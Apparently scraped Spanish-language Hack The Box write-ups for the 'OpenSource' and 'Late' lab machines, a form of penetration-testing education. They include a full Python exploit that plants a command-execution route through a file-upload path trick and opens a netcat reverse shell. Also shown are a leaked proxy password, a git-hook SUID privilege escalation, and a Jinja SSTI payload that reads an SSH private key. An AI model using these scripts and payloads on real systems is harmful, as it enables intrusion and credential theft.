esta web nos habla de una aplicación llamada Upcloud que nos permite subir archivos de manera online (como observamos en la imagen anterior), y también nos permite descargar su contenido para usarla de manera local, lo cuál es bastante peligroso…Primero testeamos un poco el funcionamiento de este servicio: Subiendo un archivoSolo observamos la ruta en la que se almacenaran los archivos subidos Subiendo ningún archivoYa que sabemos que se está usando Python, basado en las rutas del error, tiene sentido que se use el microframework Flask que permite crear aplicaciones web de todo tipo.Además de muchas funciones de error, podemos ver la ruta de la aplicación /app/public/uploads/ que como vimos antes podría almacenar los archivos subidosPara quitarnos las dudas procedemos a examinar el archivo comprimido de la aplicación que nos proporcinaba la web:Usamos unzip para extraer todos los archivos:❯ unzip -q source.zip \\_________________ quite mode❯ ls -a \\______ show hidden files . .. .git app config build-docker.sh Dockerfile source.zip | |_______| | | \\________ compressed file | | | | | | | |___ simple text file that contains a list of commands that the Docker client calls while creating an image | | | | | |___ script that build an image from a Dockerfile | | | |___ Upcloud app files | |___ folder that contains all the information that is necessary for your project in version controlObservamos que hay un script para montarnos de manera local la aplicación en un contenedor usando Docker, pero qué es?En resumen, Docker que significa Estibador (persona encargada de cargar y descargar mercancias de embarcaciones), es una herramienta que permite empaquetar una aplicación y sus dependencias en un contenedor muy ligero. Existe un confusión respecto a las máquinas virtuales, pero dejemos en claro una diferencia: Container Son una abstracción de la capa de aplicación que empaqueta el código y sus dependencias Virtual Machine (VM) Son una abstracción del hardware físico que converte un servidor en muchos servidores En general los contenedores ocupan menos espacio y arrancan más rapido ya que virtualizan la parte del hardwareAparte de eso, encontramos el directorio .git, el cuál significa que existen diferentes versiones del proyecto las cuales podemos ver y examinarEntramos al directorio y buscamos los logs con el comando git log para ver los diferentes cambios “commits” que se han hecho, pero no encontramos nadaEntonces examinamos las ramas o branches (ramas del estado del código que crean un nuevo camino para la evolución del mismo) que existen:❯ git branch dev* public❯ git log dev -p**********************************************diff --git a/app/.vscode/settings.json b/app/.vscode/settings.json deleted file mode 100644 index 5975e3f..0000000 --- a/app/.vscode/settings.json+++ /dev/null @@ -1,5 +0,0 @@ -{ - &quot;python.pythonPath&quot;: &quot;/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python&quot;, - &quot;http.proxy&quot;: &quot;http://dev01:Soulless_Developer#2022@10.10.10.128:5187/&quot;, \\______________ posible credentials !- &quot;http.proxyStrictSSL&quot;: false-} commit a76f8f75f7a4a12b706b0cf9c983796fa1985820 Author: gituser &amp;lt;gituser@local&amp;gt;Date: Thu Apr 28 13:46:16 2022 +0200************************************************************************Con el comando git branch logramos encontrar dos ramas, y al ver las diferencias de cada commit con el comando git log &amp;lt;branch_name&amp;gt; -p encontramos unas credenciales de un posible usuario dev01Ahora intentamos examinar los archivos de la aplicación para entender su funcionamiento, y aquí una pista del nombre la máquina Opensource Opensource Es un codigo diseñado para el acceso publico. De manera colaborativa distintas comunidades pueden ver y modifcar el codigo para su mejora continuaExaminamos el directorio config y encontramos el archivo supervisord.conf Supervidord Sistema cliente/servidor que permite controlar los procesos/servicios dentro de un sistema UNIX[supervisord]user=rootnodaemon=truelogfile=/dev/nulllogfile_maxbytes=0pidfile=/run/supervisord.pid[program:flask]command=python /app/run.pystdout_logfile=/dev/stdoutstdout_logfile_maxbytes=0stderr_logfile=/dev/stderrstderr_logfile_maxbytes=0Podemos observar que el usuario root ejecutara el comando python /app/run.py, el cuál posiblemente inicia el funcionamiento de la aplicaciónAhora examinamos el directorio app y efectivamente, ese archivo inicia todo el proceso pero además importa mas archivos en otro directorio también llamado appDespués de analizar cada archivo logramos entender como es el funcionamiento y la posible brecha que podemos explotarCon el conocimiento del microframework Flask podemos usar a nuestro favor el siguiente archivo views.py:import osfrom app.utils import get_file_namefrom flask import render_template, request, send_filefrom app import app@app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])def upload_file(): if request.method == &#39;POST&#39;: f = request.files[&#39;file&#39;] file_name = get_file_name(f.filename) file_path = os.path.join(os.getcwd(), &quot;public&quot;, &quot;uploads&quot;, file_name) f.save(file_path) return render_template(&#39;success.html&#39;, file_url=request.host_url + &quot;uploads/&quot; + file_name) return render_template(&#39;upload.html&#39;)@app.route(&#39;/uploads/&amp;lt;path:path&amp;gt;&#39;)def send_report(path): path = get_file_name(path) return send_file(os.path.join(os.getcwd(), &quot;public&quot;, &quot;uploads&quot;, path))Lo que observamos son las diferentes rutas del servicio web y sus respectivas funciones que se ejecutarán al acceder a estas. Además, anteriormente en el mensaje de error logramos ver que se trabaja con el archivo en la ruta /app/app/views.py el cuál es este mismo. Entonces…. que pasa si subimos el archivo modificandolo y logramos reemplazarlo con el original?FootholdLo que haremos será agregar una nueva ruta al archivo views.py y con ello la funcionalidad, insertando un parametro por get, para realizar ejecución remota de comandos RCE (Remote command execution), luego la subiremos por la aplicación Upcloud, pero antes de eso (g.e interceptando por Burpsuite), ya que sabemos su ruta exacta, cambiamos su nombre por aquella ruta y así reemplazará al archivo original pero con nuestra funcionalidad agregada. Para ello hice un script en Python para automatizar todo el proceso:import requests, signal, sys, subprocess, shlex, argparse, timefrom pwn import *# testingimport pdb# ctrl + c (function)def signal_handler(signum, frame): log.failure(&quot;Interruption&quot;); sys.exit()# ctrl + c (event)signal.signal(signal.SIGINT, signal_handler)# global variablestarget_url = &quot;http://10.10.11.164:80/upcloud&quot;file_path_name = &quot;/app/app/views.py&quot; # important!# argumentsparser = argparse.ArgumentParser(description=&#39;Reverse shell to container&#39;)parser.add_argument(&#39;-ip&#39;, type=str, required=True, help=&#39;ip address to receive shell&#39;)parser.add_argument(&#39;-port&#39;, type=int, required=True, help=&#39;port to receive shell&#39; )args = parser.parse_args()# malicious function# - - - - - - - - - - # revshell_function = &quot;&quot;&quot;# app.route(&#39;/reverse&#39;)# def shell():# return os.system(request.args.get[&#39;cmd&#39;])# &quot;&quot;&quot;# create malicious filedef create_file(): try: open(&#39;views.py&#39;) except FileNotFoundError: with open(&#39;views.py&#39;, &#39;w&#39;) as file: file.write(&quot;&quot;&quot;import os\\nfrom app.utils import get_file_name\\nfrom flask import render_template, request, send_file\\nfrom app import app\\n\\n@app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])\\ndef upload_file(): #hacked\\n\\tif request.method == &#39;POST&#39;:\\n\\t\\tf = request.files[&#39;file&#39;]\\n\\t\\tfile_name = get_file_name(f.filename)\\n\\t\\tfile_path = os.path.join(os.getcwd(), &quot;public&quot;, &quot;uploads&quot;, file_name)\\n\\t\\tf.save(file_path)\\n\\t\\treturn render_template(&#39;success.html&#39;, file_url=request.host_url + &quot;uploads/&quot; + file_name)\\n\\treturn render_template(&#39;upload.html&#39;)\\n\\n@app.route(&#39;/uploads/&amp;lt;path:path&amp;gt;&#39;)\\ndef send_report(path):\\n\\tpath = get_file_name(path)\\n\\treturn send_file(os.path.join(os.getcwd(), &quot;public&quot;, &quot;uploads&quot;, path))\\n\\n@app.route(&#39;/reverse&#39;)\\ndef shell():\\n\\treturn os.system(request.args.get(&#39;cmd&#39;))&quot;&quot;&quot;)# upload file with malicious functiondef request_POST(p): time.sleep(2) p.status(&#39;Getting reverse shell...&#39;) create_file() try: files = { &#39;file&#39; : (file_path_name, open(&#39;views.py&#39;, &#39;rb&#39;), &#39;text/x-python&#39;) } r = requests.post(target_url, files=files) except Exception as e: p.failure(&quot; {} ocurred.&quot;.format(e)) log.info(&#39;File upload&#39;) return p# get reverse shelldef get_shell(p): time.sleep(2) log.info(&#39;Listen on PORT {} to receive the shell&#39;.format(args.port)) input(&#39;Press enter to continue&#39;) try: log.info(&#39;Inserting payload to reverse shell&#39;) payload = &#39;http://10.10.11.164/reverse?cmd=rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2&amp;gt;%261|nc+{}+{}+&amp;gt;/tmp/f&#39;.format(args.ip, args.port) subprocess.run(shlex.split(&#39;/usr/bin/curl {}&#39;.format(payload)), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) except Exception as e: p.failure(&quot; {} ocurred.&quot;.format(e)) p.success(&#39;Successful reverse shell&#39;)if __name__ == &#39;__main__&#39;: p = log.progress(&#39;Starting attack&#39;) get_shell(request_POST(p)) Puedes descargar el script en mi repositorio https://github.com/E1P0TR0Ejecutamos el script python3 exploit.py -ip &amp;lt;ip-address&amp;gt; -port &amp;lt;local_port&amp;gt; nos ponemos en escucha por el puerto especificado y logramos entrar al contenedor como root:──────────────────────────────────────────────────────❯ python3 exploit.py -ip 10.10.14.181 -port 4444[+] Starting attack: Successful reverse shell[*] File upload[*] Listen on PORT 4444 to receive the shellPress enter to continue[*] Inserting payload to reverse shell──────────────────────────────────────────────────────❯ rlwrap nc -lvnp 4444Ncat: Version 7.92 ( https://nmap.org/ncat )Ncat: Listening on :::4444Ncat: Listening on 0.0.0.0:4444Ncat: Connection from 10.10.11.164.Ncat: Connection from 10.10.11.164:45805./bin/sh: can&#39;t access tty; job control turned offwhoamiroot/app # Usamos el comando rlwrap para de alguna manera recibir una shell un poco mas funcional, pero es mas recomendable hacer un tratamiento de la ttyYa en el contenedor procedemos a hacer un reconocimiento básico y haciendo un listado del /etc/passwd vemos que el usuario usa una shell de Unix ligera llamada ashViendo la configuración de la interfaz de red con ifconfig observamos que no nos encontramos en la máquina víctima sino en el contenedor pero que debería tener una conexión. Además observamos que nos encontramos en la red 172.17.0.7/16 y podemos asumir que la 172.17.0.1 actua como Gateway (puerta de enlace) y por ende la máquina vítima, pero qué es un Gateway? Gateway Es un dispositivo, mayormente un ordenador, que actua como traductor de dos sistemas que no utilizan los mismos protocolos. También ayuda a establecer la comunicacion entre multiples entornos, osea entre equipos de diferentes redesCon está información y sabiendo que puertos tiene abiertos la máquina, usamos nc 172.17.0.1 &amp;lt;port&amp;gt; para validar que tiene abierto/filtrado los puertos 22, 80, 3000:/app # nc 172.17.0.1 80 -v 172.17.0.1 (172.17.0.1:80) open &amp;lt;-- open port !nc: too many output retries/app # nc 172.17.0.1 3000 -v172.17.0.1 (172.17.0.1:3000) open &amp;lt;-- open port !HTTP/1.1 400 Bad RequestContent-Type: text/plain; charset=utf-8Connection: close400 Bad Requestnc: too many output retries/app # nc 172.17.0.1 22 -v172.17.0.1 (172.17.0.1:22) open &amp;lt;-- open port !SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.7Comprobamos que la 172.17.0.1 es la 10.10.11.164 y tenemos el puerto 3000 abierto pero solo tenemos una conexión desde el contenedor pero no de nuestra máquina local. Pero existe solución a eso usando la técnica de Remote port forwarding para enrutar el tráfico de la máquina víctima por su puerto 3000 a un puerto local nuestro (e.g 3000) y poder ver que servicio existePara aplicar la técnica procedemos a usar la herramienta Chisel: Instalación para disminuir considerablemente el ejecutable y mantener su funcionalidad❯ gunzip chisel_1.7.7_linux_amd64.gz❯ mv chisel_1.7.7_linux_amd64 chisel❯ du -hc chisel7.8M chisel 7.8M total &amp;lt;------ initial size❯ chmod +x chisel❯ upx chisel Ultimate Packer for eXecutables Copyright (C) 1996 - 2020UPX 3.96 Markus Oberhumer, Laszlo Molnar &amp;amp; John Reiser Jan 23rd 2020 File size Ratio Format Name -------------------- ------ ----------- ----------- 8077312 -&amp;gt; 3107968 38.48% linux/amd64 chisel Packed 1 file.❯ du -hc chisel3.0M chisel3.0M total &amp;lt;------ final sizeAhora solo copiamos el executable a la máquina víctima y creamos el tunel: Aplicación de Remote port forwarding❯ ./chisel server -p 8080 --reverse &amp;lt;------ Máquina atacante2022/06/29 15:02:02 server: Reverse tunnelling enabled2022/06/29 15:02:02 server: Fingerprint 1R58OXwRvuvhMHAl4v/FHZtVmD14WxmMw9BPFeAijBs=2022/06/29 15:02:02 server: Listening on http://0.0.0.0:80802022/06/29 15:02:09 server: session#1: tun: proxy#R:3000=&amp;gt;172.17.0.1:3000: Listening────────────────────────────────────────────────────────────────────────────────────────/tmp # ./chisel client 10.10.14.181:8080 R:3000:172.17.0.1:3000 &amp;lt;------ Máquina víctima2022/06/29 20:02:10 client: Connecting to ws://10.10.14.181:80802022/06/29 20:02:11 client: Connected (Latency 108.331821ms) Puedes descargar la herramienta en el siguiente repositorio https://github.com/jpillora/chiselAhora entramos a nuestro localhost por el puerto 3000:Viendo la página y buscando en internet sabemos que Gitea es un software “opensource” de control de versiones, similar a Github. Además vemos un panel para logearnos, y probando las credenciales que también son parte de un usuario con un repositorio git logramos acceder como dev01. Luego logramos ver un repositorio de un backup de su directorio home y con ello su private key (id_rsa)Ahora solo nos descargamos esa llave, le damos sus respectivos permisos como clave privada chmod 600 &amp;lt;private_key&amp;gt;, logramos logearnos y conseguir la flag:❯ chmod 600 id_rsa❯ ssh -i id_rsa dev01@10.10.11.164Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-176-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Wed Jun 29 20:42:21 UTC 2022 System load: 0.34 Processes: 238 Usage of /: 75.8% of 3.48GB Users logged in: 1 Memory usage: 25% IP address for eth0: 10.10.11.164 Swap usage: 0% IP address for docker0: 172.17.0.116 updates can be applied immediately.9 of these updates are standard security updates.To see these additional updates run: apt list --upgradableLast login: Wed Jun 29 18:21:55 2022 from 10.10.16.22-bash-4.4$ find / -name flag.txt 2&amp;gt;/dev/null | xargs ls -ltotal 4-rw-r----- 1 root dev01 33 Jun 29 18:12 user.txtPrivilege EscalationPara escalar privilegios empezamos con un reconocimiento básico del sistema operativo, ver que usuarios existen, archivos con permisos SUID, archivos que podemos ejecutar como usuario root, etc. Al final no conseguimos algo interesante y como es una máquina fácil podemos tirar de la herramienta pspy para listar procesos del sistema sin ser usuario rootLo descargamos, lo pasamos a la máquina víctima, lo ejecutamos en una ruta con permisos y encontramos algo interesante:bash-4.4$ ./pspy64 [507/507]pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855 ██▓███ ██████ ██▓███ ▓██ ██▓ ▓██░ ██▒▒██ ▒ ▓██░ ██▒▒██ ██▒ ▓██░ ██▓▒░ ▓██▄ ▓██░ ██▓▒ ▒██ ██░ ▒██▄█▓▒ ▒ ▒ ██▒▒██▄█▓▒ ▒ ░ ▐██▓░ ▒██▒ ░ ░▒██████▒▒▒██▒ ░ ░ ░ ██▒▓░ ▒▓▒░ ░ ░▒ ▒▓▒ ▒ ░▒▓▒░ ░ ░ ██▒▒▒ ░▒ ░ ░ ░▒ ░ ░░▒ ░ ▓██ ░▒░ ░░ ░ ░ ░ ░░ ▒ ▒ ░░ ░ ░ ░ ░ ░ Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive) Draining file system events due to startup... done *************************************************************************************************************************************************************2022/06/29 21:45:01 CMD: UID=0 PID=7453 | /usr/sbin/CRON -f 2022/06/29 21:45:01 CMD: UID=0 PID=7452 | /usr/sbin/CRON -f 2022/06/29 21:45:01 CMD: UID=0 PID=7455 | git status --porcelain 2022/06/29 21:45:01 CMD: UID=0 PID=7454 | /bin/bash /usr/local/bin/git-sync 2022/06/29 21:45:01 CMD: UID=??? PID=7457 | 2022/06/29 21:45:01 CMD: UID=0 PID=7458 | git commit -m Backup for 2022-06-29 2022/06/29 21:45:01 CMD: UID=0 PID=7461 | git push origin main 2022/06/29 21:45:01 CMD: UID=0 PID=7462 | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git *********************************************************************************************************************************************************************** Puedes decargar la herramienta en el siguiente repositorio https://github.com/DominicBreuker/pspyObservamos que existe un proceso donde el usuario root está ejecutando comandos con git. Averiguando posibles vulnerabilidades encontramos que al utilizar git hooks para ejecutar comandos, pero qué es exactamente? Git hooks Son scripts automatizados al utilizar comandos git, osea, se enganchan a comandos de git (g.e git commit, git add, git push) Mas información sobre Git Hooks Página de binarios Unix que pueden ser explotados como git https://gtfobins.github.io/gtfobins/git/Al iniciar un repositorio, estos scripts se almacenan en la ruta .git/hooks y sus respectivos nombres descriptivos .sample de acuerdo a la acción que realizarán. Para activar su ejecución solo debemos quitarle la terminación .sampleObservamos que se está ejecutando git commit -m ..., luego se hace un push y un git remote sobre el repositorio del usuario dev01. Con esa información podemos deducir que debemos aplicar está explotación sobre ese repositorio que tenemos en la ruta home/dev01/.git, con lo cuál podemos usar el script pre-commit.sample almacenado en /hooks, insertar que se asigne permisos SUID al a la bash y luego acceder como su propietario root y obtener la flag:bash-4.4$ pwd/home/dev01/.git/hooksbash-4.4$ ls -l /bin/bash &amp;lt;------------------------------------ check bash permissions (not SUID)-rwxr-xr-x 1 root root 1113504 Apr 18 15:08 /bin/bashbash-4.4$ head -n 5 pre-commit.sample &amp;lt;-------------------------- check hook (script) to be executed before commit command#!/bin/sh## An example hook script to verify what is about to be committed.# Called by &quot;git commit&quot; with no arguments. The hook should# exit with non-zero status after issuing an appropriate message ifbash-4.4$ sed -i &quot;2i chmod u+s /bin/bash&quot; pre-commit.sample &amp;lt;-------- add in the second line command to assign SUID permissions to bashbash-4.4$ head -n 5 pre-commit.sample &amp;lt;-------------------------- check changes#!/bin/shchmod u+s /bin/bash## An example hook script to verify what is about to be committed.# Called by &quot;git commit&quot; with no arguments. The hook shouldbash-4.4$ mv pre-commit.sample pre-commit &amp;lt;---------------------- rename to activate the script and root run itbash-4.4$ ls -l /bin/bash &amp;lt;-------------------------------------- check bash permissions (SUID)-rwsr-xr-x 1 root root 1113504 Apr 18 15:08 /bin/bashbash-4.4$ bash -p &amp;lt;-------------------------------------- run bash as the owning user (root user)bash-4.4# whoamirootbash-4.4# find / -name root.txt | xargs ls -l-rw-r----- 1 root root 33 Jun 29 18:12 /root/root.txtbash-4.4# " }, { "title": "Hackthebox Writeup Late", "url": "/posts/HTBLate/", "categories": "HTB, Writeups", "tags": "HTB, Linux, Easy, OCR, Flask, Jinja, Bash Scripting, SSTI, pspy, Cron job, Suid", "date": "2022-05-09 17:43:13 -0500", "snippet": "Máquina Linux donde al enumerar encontramos un servicio web abierto que aplicaba Virtual Hosting y nos permitia llegar a otra web con un programa para convertir imágenes a texto Optical Character Recognotion (OCR) con el framework Flask, el cuál era vulnerable a SSTI con un payload basado en el template Jinja. Logramos Remote Code Execution (RCE), leemos la llave privada y conseguimos la shell por SSH. Para la escalada tiramos de pspy y encontramos un script cron que ejecutaba el usuario root cada vez que un usuario entraba por SSH, además aplicaba una asignación de atributo para poder modificar el archivo de una manera peculiar pero sencilla. Por último, agregamos un comando al script para asignar permisos SUID a la bash, volvemos a iniciar sesión por SSH, ejecutamos la bash en modo privilegiado y obtenemos la shell como root OS IP Release Date Difficulty Points Linux 10.10.11.156 23 Apr 2022 Easy 20 Antes de empezar verificamos que estamos conectado a la VPN de HTB y tenemos conexión con la máquina:&amp;gt; ping -c1 10.10.11.156PING 10.10.11.156 (10.10.11.156) 56(84) bytes of data.64 bytes from 10.10.11.156: icmp_seq=1 ttl=63 time=116 ms \\______________________ Linux Machine--- 10.10.11.156 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0ms \\_________________\\____________________________________ Successful connectionrtt min/avg/max/mdev = 115.778/115.778/115.778/0.000 ms Explicación de parámetros: -c &amp;lt;count&amp;gt; : Número de paquetes ICMP que deseamos enviar a la máquinaEnumerationCon nmap realizamos un escaneo de tipo TCP (Transfer Control Protocol) para descubrir puertos abiertos:❯ nmap -p- --open -sS --min-rate 5000 -n 10.10.11.156Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-09 18:10 -05Nmap scan report for 10.10.11.156Host is up (0.11s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh \\_________ Secure Shell Protocol80/tcp open http \\_________ HyperText Transfer Protocol Explicación de parámetros : -p- : Escanear todos los puertos, del 1 al 65,535 --open : Escanear solo puertos abiertos -sS : Solo enviar paquetes de tipo SYN (inicio de conexión), incrementa velocidad del escaneo --min-rate &amp;lt;number&amp;gt; : Enviar una taza (&amp;lt;number&amp;gt;) de paquetes por segundo como mínimo -v : Imprimir información del proceso del escaneoAhora escaneamos de manera específica los puertos 22 (SSH) - 80 (HTTP) en cuestión:❯ nmap -p 22,80 -sCV -oN targetTCP 10.10.11.156Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-09 18:15 -05Nmap scan report for images.late.htb (10.10.11.156)Host is up (0.11s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)| 256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)|_ 256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)80/tcp open http nginx 1.14.0 (Ubuntu)|_http-title: Image Reader|_http-server-header: nginx/1.14.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Explicación de parámetros : -p &amp;lt;port_1,port_2,...&amp;gt; : Indicamos que puertos queremos escanear -sC : Ejecutar en los puertos scripts por defecto de nmap -sV : Activar detección de versiones de los servicios que corren por los puertos -oN &amp;lt;file&amp;gt; : Guardar el output del escaneo en un archivo con formato NmapYa que no disponemos de credenciales para entrar por SSH, empezamos con el servicio web que corre por el puerto 80 (HTTP): Con whatweb podemos ver tecnologías que usa el sitio❯ whatweb http://10.10.11.156http://10.10.11.156 [200 OK] Bootstrap[3.0.0], Country[RESERVED][ZZ], Email[#,support@late.htb], Google-API[ajax/libs/jquery/1.10.2/jquery.min.js], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.11.156], JQuery[1.10.2], Meta-Author[Sergey Pozhilov (GetTemplate.com)], Script, Title[Late - Best online image tools], nginx[1.14.0] Si quieres una opción gráfica puedes usar en tu navegador la extensión Wappalyzer y ver las tecnologías Con Firefox podemos ver el sitio webSolo encontramos de interesante el subdominio images.late.htb, lo agregamos a nuestro archivo /etc/hosts: echo &quot;10.10.11.156 images.late.htb&quot; &amp;gt;&amp;gt; /etc/hosts para aplicar Virtual hosting: Tambien podemos encontrar el subdominio usando curl❯ curl -s &quot;http://10.10.11.156&quot; | grep -oE &quot;http.*htb&quot; | sort -uhttp://images.late.htbObservamos una web con la funcionalidad de convertir una imagen a texto usando Flask. Averiguamos en internet para entender mejor los conceptos: ¿ Qué es Flask ? Mas información: https://pythonbasics.org/what-is-flask-python/ ¿ Qué es la tecnología OCR ? Mas información: https://www.ibm.com/cloud/blog/optical-character-recognitionEstá muy claro que solo nos permite subir imágenes (.png, .jpeg), pero que tal si intentamos engañar al programa pasandole un archivo .png con una cadena de texto: echo &#39;testing&#39; &amp;gt; test.pngOjito!, vemos un mensaje de error y recibimos la ruta completa del archivo subido. Como es costumbre, los usuarios se ubican en la ruta home, con ello podemos deducir que existe un usuario llamado svc_acc Buscando aplicaciones OCR que usen Flask, encontramos un repositorio de GitHub con una interfaz muy similar: https://github.com/lucadibello/ImageReaderExaminando que réquisitos necesita observamos Jinja2. Además, con la información sobre Flask sabemos que depende del template Jinja2 ¿ Qué es Jinja ? Más información: https://palletsprojects.com/p/jinja/FootholdCon la idea de como trabaja por detrás este software procedemos a buscar vulnerabilidades y encontramos un posible SSTI (Server Site Template Injection) que proviene del Template Jinja que usa el framework Flask: Validamos que es vulnerable:❯ convert -pointsize 18 label:&#39;{ { 7 * 7 } }&#39; test.png \\_________________________________________________ Create image from a text❯ curl -is -XPOST -F &quot;file=@test.png&quot; http://images.late.htb/scanner \\_________________________________________________ Transfer data to serverHTTP/1.1 200 OKServer: nginx/1.14.0 (Ubuntu)Date: Tue, 10 May 2022 05:45:00 GMTContent-Type: text/plain; charset=utf-8Content-Length: 10Connection: keep-aliveContent-Disposition: attachment; filename=results.txtLast-Modified: Tue, 10 May 2022 05:45:00 GMTCache-Control: no-cacheETag: &quot;1652161500.115982-10-372837928&quot;&amp;lt;p&amp;gt;49 ______________________________ Vulnerable to SSTI !&amp;lt;/p&amp;gt; Explicación de parámetros : convert : -pointsize &amp;lt;number&amp;gt;: Asignar tamaño a la fuente del texto label:&amp;lt;text&amp;gt; : Asignar texto a convertir curl : -is : Incluir cabezeras en la respuesta HTTP y ocultar medidor de progreso/posibles errores -F “&amp;lt;form-field_name&amp;gt;=@&amp;lt;file_name&amp;gt;”: Permite subir archivos/data por POST Para hacer la conversión puedes usar muchas herramientas online, y para la petición, la misma web te dara la respuesta en un .txt. También puedes usar burpsuite para visualizar la respuesta. Mas información sobre SSTI Flask: https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/Al intentar subir imágenes nos dimos cuenta que el tamaño de la letra y probablemente la fuente, afectan la ejecución de la inyeccción.Para conseguir la ejecución hice un script en bashal cuál le pasas un payload del template Jinja; aplicando Bypassing &#39;_&#39; y quitando las llaves { { } }; para luego probar con diferentes fuentes y tamaños, validar que la conversión se realizo correctamente y ejecutarlo:#!/bin/bash# Script to find the font and size for payload execution# extract fontsif [ ! -f fonts.txt ]; then curl -s https://www.azfonts.net/fonts/popular | grep &quot;font-item__title&quot; -A 1 | grep -v &quot;font-item__title&quot; | awk -F&quot;&amp;gt;&quot; &#39;{print $2}&#39; | sed &#39;s/&amp;lt;\\/strong//g&#39; | tr -s &#39;\\n&#39; | sed &#39;51,100d&#39;fi# variablesc=1payload=$1url=&quot;http://images.late.htb/scanner&quot;while read font; do clear sleep 2 echo $c &quot;[+] &quot;$font size=8 for i in $(seq 1 20); do data=$(echo Size : $size - Fontsize : $font) convert -pointsize $size -font &quot;$font&quot; label:&quot;$payload&quot; data.png sleep 0.5 echo -e &quot;\\t&quot; &quot;Fontsize : $size&quot; output=$(curl -is -XPOST -F &quot;file=@data.png&quot; $url | grep &quot;&amp;lt;p&amp;gt;&quot; | awk -F &quot;&amp;gt;&quot; &#39;{print $2}&#39;) echo -e &quot;\\t&quot; $output if [ &quot;$output&quot; = &quot;$payload&quot; ]; then echo -e &quot;\\n\\n[!] Same payload -&amp;gt; &quot; $data exec=&quot;{ { $payload } }&quot; convert -pointsize $size -font &quot;$font&quot; label:&quot;$exec&quot; data.png echo -e &quot;[+] Payload converted to execution:\\n&quot; curl -s -XPOST -F &quot;file=@data.png&quot; $url exit 1 fi let size+=2 done let c+=1done &amp;lt; fonts.txt Pueden encontrar el script en mi repositorio: https://github.com/E1P0TR0Recordamos que vimos un usuario llamado svc_acc, además sabemos que el puerto 22 estaba abierto. Así que en la clásica ruta /home/{user}/.ssh/private_key logramos visualizar la private_key:❯ ./script.sh &#39;get_flashed_messages[&quot;__globals__&quot;][&quot;__builtins__&quot;].open(&quot;/home/svc_acc/.ssh/id_rsa&quot;).read()&#39;1 [+] Avenir Pro Light Fontsize : 8 Qet_fashed_messages[_ gobais &quot;T_ bulltms_ “].opan|&quot;nome&#39;svc_acc/.ssid rsa”) read{) Fontsize : 10 .s j.open(&quot;/home/svc_acc/.ssh/id_rsa&quot;).read() Fontsize : 12 get_flashed_messages[&quot;_ globals__&quot;J[&quot;__builtins__&quot;].open(&quot;/yhome/svc_ace/.ssh/id_rsa&quot;).read() Fontsize : 14 get flashed _messages[&quot; globals_ &quot;][&quot;__ builtins _&quot;].open(&quot;/home/svc_acc/.ssh/id_rsa&quot;).read() Fontsize : 16 get_flashed_messages[&quot;__globals__&quot;J[&quot;__builtins__&quot;].open(&quot;/home/svc_acc/.ssh/id_rsa&quot;).read() Fontsize : 18 get_flashed_messages[&quot;__globals__&quot;][&quot;__builtins__&quot;].open(&quot;/home/svc_acc/.ssh/id_rsa&quot;).read() [!] Same payload -&amp;gt; Size : 18 - Fontsize : Avenir Pro Light [+] Payload converted to execution: &amp;lt;p&amp;gt;-----BEGIN RSA PRIVATE KEY----- MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO bgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi /mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7********************************************************************************************************************************&amp;lt;/p&amp;gt; Gran Repositorio de Template Inyections: https://github.com/swisskyrepo/PayloadsAllTheThingsAhora guardamos la llave en un archivo llamado id_rsa, le damos permisos de una llave privada chmod 600 y pa-dentro:❯ chmod 600 id_rsa❯ ssh -i id_rsa svc_acc@10.10.11.156No mail.svc_acc@late:~$ find / -name user.txt 2&amp;gt;/dev/null | xargs ls -l-rw-r----- 1 root svc_acc 33 May 10 04:20 /home/svc_acc/user.txtPrivilege EscalationDespués de una enumeración básica no logramos encontrar algo interesante. Pero nos dimos cuenta al entrar por SSH el mensaje No mail, además en la enumeración encontramos archivos .bak (backups), pero no logramos obtener credenciales.Ahora procedemos a listar cron jobs y comandos que executan los usuarios del sistema, para ello usamos la herramienta pspy: Descargamos la herramienta en su repositorio: https://github.com/DominicBreuker/pspy En nuestra máquina montamos un servicio web con php:❯ ls pspy64❯ php -S 0.0.0.0:1234[Tue May 10 20:28:33 2022] PHP 8.1.2 Development Server (http://0.0.0.0:1234) started En la máquina víctima descargamos el archivo pspy64 en una carpeta con acceso:svc_acc@late:~$ cd /tmp/svc_acc@late:/tmp$ mkdir privescsvc_acc@late:/tmp$ cd !$cd privescsvc_acc@late:/tmp/privesc$ wget http://10.10.14.181:1234/pspy64--2022-05-11 01:33:35-- 